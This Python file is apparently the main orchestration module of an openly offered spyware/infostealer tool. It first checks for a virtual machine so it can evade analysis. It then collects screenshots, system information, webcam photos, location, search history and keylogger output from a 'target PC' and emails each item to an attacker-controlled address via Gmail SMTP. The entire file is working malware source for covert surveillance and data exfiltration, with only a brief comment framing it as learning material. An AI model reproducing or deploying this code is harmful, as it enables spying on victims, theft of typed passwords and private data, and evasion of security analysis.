import os
import time
import random
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib
from datetime import datetime
from screen_shot import ScreenShotFile
from Full_Information import information
from Credentials import Get_Credentials
from Check_VM import check_VM
from capture_webcam import Camera_
from Location import Request_Location
from Search_History import get_history_search
from keylogger import get_key


# Sent Everything to email can be CV ,C2 Servers also can be Customized
# 8/13/2025
# Aux-441
# Good Luck Learning


started_time = datetime.now()
print("Started Time Sending Email :", started_time)

# Load All modules ..
time.sleep(random.randint(1,3))

class Send_all_information:

    def Send_information(self):

        C = Get_Credentials()

        try:
            Sender, Password, Receiver = C.Credentials()
            print(f"Sender : {Sender}")
            print(f"Password : {Password}")
            print(f"Receiver : {Receiver}")
        except Exception as e:
            print(f"Failed to get credentials: {e}")
            return

        try:
            file = check_VM()
            if file.check_vm_mac():
                print("VM detected, Stopping Script ...")
                return
            else:
                print("VM not detected, Continue.")

        except Exception as e:
            print(f"Failed to Execute VM Function .. {e}")
            return

        try:
            msg = MIMEMultipart()
            msg["From"] = Sender
            msg["To"] = Receiver
            msg["Subject"] = f"Empty Message - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"

            msg.attach(MIMEText("Running on Real Machine not VM", "plain"))

            server = smtplib.SMTP("smtp.gmail.com", 587)
            server.starttls()
            server.login(Sender, Password)
            server.send_message(msg)
            server.quit()
            print("Empty email sent successfully.")

        except Exception as e:
            print(f"Failed to Sent Tell user VM OR NOT email: {e}")

        try:
            print("Running Screen shot Function ...")
            screenshot_file = ScreenShotFile()
            with screenshot_file.Scree_Shot() as screen:
                msg = MIMEMultipart()
                msg["From"] = Sender
                msg["To"] = Receiver
                msg["Subject"] = f"File - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
                msg.attach(MIMEText("Screen_shot from Target PC.", "plain"))

                part = MIMEBase("application", "octet-stream")
                part.set_payload(screen.read())
                encoders.encode_base64(part)
                part.add_header("Content-Disposition", 'attachment; filename="screenshot.png"')
                msg.attach(part)

                try:
                    server = smtplib.SMTP("smtp.gmail.com", port=587)
                    server.starttls()
                    server.login(Sender, Password)
                    server.send_message(msg)
                    server.quit()
                    print("Successfully Sent Email ..")
                except Exception as e:
                    print(f"Failed to Send Screen shot to Target Email : {e}")

        except Exception as e:
            print(f"Error capturing or sending screenshot: {e}")

        try:
            info_file = information()
            info_file.information_()
            print("Running Full information Function ...")

            msg = MIMEMultipart()
            msg['From'] = Sender
            msg['To'] = Receiver
            msg['Subject'] = "Information File"

            filename = "information.txt"
            with open("full_informations/information.txt", "rb") as attachment:
                part = MIMEBase('application', 'octet-stream')
                part.set_payload(attachment.read())
                encoders.encode_base64(part)
                part.add_header('Content-Disposition', f'attachment; filename={filename}')
                msg.attach(part)

            server = smtplib.SMTP('smtp.gmail.com', 587)
            server.starttls()
            server.login(Sender, Password)
            server.sendmail(Sender, Receiver, msg.as_string())
            server.quit()

        except Exception as e:
            print(f"Failed to Send Full_information File : {e}")

        try:
            print("Running Function Webcam ...")
            File = Camera_()
            image_path = File.get_picture()

            if image_path:
                msg = MIMEMultipart()
                msg["From"] = Sender
                msg["To"] = Receiver
                msg["Subject"] = f"Webcam Photo - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
                msg.attach(MIMEText("Captured webcam image from target PC.", "plain"))

                with open(image_path, "rb") as attachment:
                    part = MIMEBase("application", "octet-stream")
                    part.set_payload(attachment.read())
                    encoders.encode_base64(part)
                    part.add_header("Content-Disposition", f'attachment; filename="{os.path.basename(image_path)}"')
                    msg.attach(part)

                server = smtplib.SMTP("smtp.gmail.com", 587)
                server.starttls()
                server.login(Sender, Password)
                server.send_message(msg)
                server.quit()
                print("Successfully sent webcam photo.")

            else:
                print("No webcam photo to send.")

        except Exception as e:
            print(f"Failed to capture/send webcam photo: {e}")

        try:
            print("Running Function Location ...")
            location_file = Request_Location()
            location_file.Location()

            msg = MIMEMultipart()
            msg["From"] = Sender
            msg["To"] = Receiver
            msg["Subject"] = f"Location Information - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
            msg.attach(MIMEText("Location information from target PC.", "plain"))

            filename = "location.txt"
            filepath = os.path.join("full_informations", filename)

            with open(filepath, "rb") as attachment:
                part = MIMEBase("application", "octet-stream")
                part.set_payload(attachment.read())
                encoders.encode_base64(part)
                part.add_header("Content-Disposition", f'attachment; filename="{filename}"')
                msg.attach(part)

            server = smtplib.SMTP("smtp.gmail.com", 587)
            server.starttls()
            server.login(Sender, Password)
            server.send_message(msg)
            server.quit()
            print("Successfully sent location file.")

        except Exception as e:
            print(f"Failed to send location file: {e}")

        try:
            print("Running Function Search History ...")
            get_history_search.run_search_history()

            msg = MIMEMultipart()
            msg["From"] = Sender
            msg["To"] = Receiver
            msg["Subject"] = f"Search History - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
            msg.attach(MIMEText("Search history from target PC.", "plain"))

            filename = "search.txt"
            filepath = os.path.join("full_informations", filename)

            with open(filepath, "rb") as attachment:
                part = MIMEBase("application", "octet-stream")
                part.set_payload(attachment.read())
                encoders.encode_base64(part)
                part.add_header("Content-Disposition", f'attachment; filename="{filename}"')
                msg.attach(part)

            server = smtplib.SMTP("smtp.gmail.com", 587)
            server.starttls()
            server.login(Sender, Password)
            server.send_message(msg)
            server.quit()
            print("Successfully sent search history file.")

        except Exception as e:
            print(f"Failed to send search history file: {e}")

        try:
            print("Running Function Keylogger ...")
            gk = get_key()
            gk.start()

            msg = MIMEMultipart()
            msg["From"] = Sender
            msg["To"] = Receiver
            msg["Subject"] = f"Keylogger Logs - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
            msg.attach(MIMEText("Captured keystrokes from target PC.", "plain"))

            filepath = r"C:\Temp\logs.txt"
            filename = "logs.txt"

            if os.path.exists(filepath):
                with open(filepath, "rb") as attachment:
                    part = MIMEBase("application", "octet-stream")
                    part.set_payload(attachment.read())
                    encoders.encode_base64(part)
                    part.add_header("Content-Disposition", f'attachment; filename="{filename}"')
                    msg.attach(part)

                server = smtplib.SMTP("smtp.gmail.com", 587)
                server.starttls()
                server.login(Sender, Password)
                server.send_message(msg)
                server.quit()
                print("Successfully sent keylogger file.")
            else:
                print("Keylogger file not found, nothing to send.")

        except Exception as e:
            print(f"Failed to send keylogger file: {e}")


C = Send_all_information()
C.Send_information()

ended_time = datetime.now()
print("Ended time All Emails Sent Successfully :", ended_time)